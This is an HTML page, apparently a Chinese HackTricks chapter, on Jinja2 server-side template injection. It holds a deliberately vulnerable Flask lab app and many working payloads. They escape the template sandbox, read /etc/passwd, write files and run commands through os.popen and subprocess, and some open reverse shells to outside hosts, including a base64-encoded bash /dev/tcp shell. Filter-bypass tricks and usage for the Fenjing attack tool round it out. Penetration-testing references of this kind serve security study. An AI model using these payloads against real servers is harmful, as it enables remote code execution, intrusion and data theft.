<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Jinja2 SSTI</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="jinja2-ssti"><a class="header" href="#jinja2-ssti">Jinja2 SSTI</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
<p>通过 8kSec 学院深化您在 <strong>移动安全</strong> 方面的专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<h2 id="实验室"><a class="header" href="#实验室"><strong>实验室</strong></a></h2>
<pre><code class="language-python">from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
</code></pre>
<h2 id="杂项"><a class="header" href="#杂项"><strong>杂项</strong></a></h2>
<h3 id="调试语句"><a class="header" href="#调试语句"><strong>调试语句</strong></a></h3>
<p>如果启用了调试扩展，将可以使用 <code>debug</code> 标签来转储当前上下文以及可用的过滤器和测试。这对于查看在模板中可以使用的内容而无需设置调试器非常有用。</p>
<pre><code class="language-python">&lt;pre&gt;

{% raw %}
{% debug %}
{% endraw %}








&lt;/pre&gt;
</code></pre>
<h3 id="转储所有配置变量"><a class="header" href="#转储所有配置变量"><strong>转储所有配置变量</strong></a></h3>
<pre><code class="language-python">{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
&lt;dt&gt;{{ key|e }}&lt;/dt&gt;
&lt;dd&gt;{{ value|e }}&lt;/dd&gt;
{% endfor %}
{% endraw %}






</code></pre>
<h2 id="jinja-注入"><a class="header" href="#jinja-注入"><strong>Jinja 注入</strong></a></h2>
<p>首先，在 Jinja 注入中，您需要<strong>找到一种方法从沙箱中逃脱</strong>并恢复访问常规的 Python 执行流程。为此，您需要<strong>滥用对象</strong>，这些对象<strong>来自非沙箱环境，但可以从沙箱中访问</strong>。</p>
<h3 id="访问全局对象"><a class="header" href="#访问全局对象">访问全局对象</a></h3>
<p>例如，在代码 <code>render_template("hello.html", username=username, email=email)</code> 中，对象 username 和 email <strong>来自非沙箱的 Python 环境</strong>，并且在<strong>沙箱环境</strong>中将是<strong>可访问的</strong>。<br />
此外，还有其他对象将<strong>始终可以从沙箱环境中访问</strong>，这些对象是：</p>
<pre><code>[]
''
()
dict
config
request
</code></pre>
<h3 id="恢复-class-object"><a class="header" href="#恢复-class-object">恢复 &lt;class 'object'&gt;</a></h3>
<p>然后，从这些对象中我们需要到达类：<strong><code>&lt;class 'object'&gt;</code></strong> 以尝试 <strong>恢复</strong> 定义的 <strong>类</strong>。这是因为从这个对象我们可以调用 <strong><code>__subclasses__</code></strong> 方法并 <strong>访问所有非沙箱</strong> python 环境中的类。</p>
<p>为了访问该 <strong>对象类</strong>，您需要 <strong>访问一个类对象</strong>，然后访问 <strong><code>__base__</code></strong>、<strong><code>__mro__()[-1]</code></strong> 或 <strong><code>mro()[-1]</code></strong>。然后，在到达这个 <strong>对象类</strong> 之后，我们 <strong>调用</strong> <strong><code>__subclasses__()</code></strong>。</p>
<p>查看这些示例：</p>
<pre><code class="language-python"># To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
</code></pre>
<h3 id="rce-escaping"><a class="header" href="#rce-escaping">RCE Escaping</a></h3>
<p><strong>恢复了</strong> <code>&lt;class 'object'&gt;</code> 并调用了 <code>__subclasses__</code>，我们现在可以使用这些类来读取和写入文件以及执行代码。</p>
<p>对 <code>__subclasses__</code> 的调用给了我们机会 <strong>访问数百个新函数</strong>，我们将仅通过访问 <strong>文件类</strong> 来 <strong>读取/写入文件</strong> 或任何具有访问权限的类，该类 <strong>允许执行命令</strong>（如 <code>os</code>）。</p>
<p><strong>读取/写入远程文件</strong></p>
<pre><code class="language-python"># ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
</code></pre>
<p><strong>RCE</strong></p>
<pre><code class="language-python"># The class 396 is the class &lt;class 'subprocess.Popen'&gt;
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

&lt;div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'&gt; a &lt;/div&gt;

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

</code></pre>
<p>要了解您可以使用的<strong>更多类</strong>以<strong>逃避</strong>，您可以<strong>查看</strong>：</p>
<p>{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
<a href="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/">bypass-python-sandboxes</a>
{% endcontent-ref %}</p>
<h3 id="过滤器绕过"><a class="header" href="#过滤器绕过">过滤器绕过</a></h3>
<h4 id="常见绕过"><a class="header" href="#常见绕过">常见绕过</a></h4>
<p>这些绕过将允许我们<strong>访问</strong>对象的<strong>属性</strong>，<strong>而不使用某些字符</strong>。<br />
我们已经在之前的示例中看到了一些这些绕过，但在这里总结一下：</p>
<pre><code class="language-bash"># Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}






</code></pre>
<ul>
<li><a href="jinja2-ssti.html#accessing-global-objects"><strong>返回这里以获取更多访问全局对象的选项</strong></a></li>
<li><a href="jinja2-ssti.html#recovering-less-than-class-object-greater-than"><strong>返回这里以获取更多访问对象类的选项</strong></a></li>
<li><a href="jinja2-ssti.html#jinja-injection-without-less-than-class-object-greater-than"><strong>阅读此内容以在没有对象类的情况下获取RCE</strong></a></li>
</ul>
<p><strong>避免HTML编码</strong></p>
<p>默认情况下，Flask出于安全原因对模板中的所有内容进行HTML编码：</p>
<pre><code class="language-python">{{'&lt;script&gt;alert(1);&lt;/script&gt;'}}
#will be
&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
</code></pre>
<p><strong><code>safe</code></strong> 过滤器允许我们将 JavaScript 和 HTML 注入到页面中 <strong>而不</strong> 进行 <strong>HTML 编码</strong>，如下所示：</p>
<pre><code class="language-python">{{'&lt;script&gt;alert(1);&lt;/script&gt;'|safe}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
</code></pre>
<p><strong>通过编写恶意配置文件进行RCE。</strong></p>
<pre><code class="language-python"># evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1"',shell=True) }}
</code></pre>
<h2 id="没有几个字符"><a class="header" href="#没有几个字符">没有几个字符</a></h2>
<p>没有 <strong><code>{{</code></strong> <strong><code>.</code></strong> <strong><code>[</code></strong> <strong><code>]</code></strong> <strong><code>}}</code></strong> <strong><code>_</code></strong></p>
<pre><code class="language-python">{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}






</code></pre>
<h2 id="jinja-注入而不使用-class-object"><a class="header" href="#jinja-注入而不使用-class-object">Jinja 注入而不使用 <strong>&lt;class 'object'&gt;</strong></a></h2>
<p>从 <a href="jinja2-ssti.html#accessing-global-objects"><strong>全局对象</strong></a> 有另一种方法可以在不使用该类的情况下获得 <strong>RCE。</strong><br />
如果你设法从这些全局对象中获取任何 <strong>函数</strong>，你将能够访问 <strong><code>__globals__.__builtins__</code></strong>，从那里获取 <strong>RCE</strong> 是非常 <strong>简单</strong> 的。</p>
<p>你可以通过以下方式从对象 <strong><code>request</code></strong>、<strong><code>config</code></strong> 和任何 <strong>其他</strong> 有趣的 <strong>全局对象</strong> 中找到 <strong>函数</strong>：</p>
<pre><code class="language-bash">{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
</code></pre>
<p>一旦你找到了一些函数，你可以通过以下方式恢复内置函数：</p>
<pre><code class="language-python"># Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}


## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
</code></pre>
<h3 id="fuzzing-waf-bypass"><a class="header" href="#fuzzing-waf-bypass">Fuzzing WAF bypass</a></h3>
<p><strong>Fenjing</strong> <a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a> 是一个专门用于CTF的工具，但在真实场景中也可以用于暴力破解无效参数。该工具仅通过喷洒单词和查询来检测过滤器，寻找绕过方法，并提供交互式控制台。</p>
<pre><code>webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/&lt;payload&gt;the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
</code></pre>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></li>
<li>查看 <a href="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3">attr trick to bypass blacklisted chars in here</a>.</li>
<li><a href="https://twitter.com/SecGus/status/1198976764351066113">https://twitter.com/SecGus/status/1198976764351066113</a></li>
<li><a href="https://hackmd.io/@Chivato/HyWsJ31dI">https://hackmd.io/@Chivato/HyWsJ31dI</a></li>
</ul>
<p>{% hint style="success" %}
学习和实践 AWS Hacking：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP Hacking：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<img src="../../.gitbook/assets/image (2).png" alt="" data-size="original">
<p>通过 8kSec Academy 深入您的 <strong>移动安全</strong> 专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/ssti-server-side-template-injection/el-expression-language.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/timing-attacks.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/ssti-server-side-template-injection/el-expression-language.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/timing-attacks.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
